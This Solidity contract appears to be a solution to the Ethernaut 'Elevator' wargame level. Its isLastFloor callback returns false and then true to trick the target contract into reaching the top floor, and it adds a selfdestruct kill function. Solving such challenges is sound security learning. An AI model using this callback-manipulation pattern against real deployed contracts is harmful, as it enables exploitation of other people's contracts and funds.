// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract MyBuilding {
    Elevator ethernautElevator;
    address payable owner;
    bool top;

    constructor(address _address) {
        ethernautElevator = Elevator(_address);
        // ethernautElevator.goTo(5);
        owner = payable(msg.sender);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        } else {
            top = false;
            return true;
        }
    }

    function goTo(uint256 floor) public {
        ethernautElevator.goTo(floor);
    }

    function kill() public {
        selfdestruct(owner);
    }
}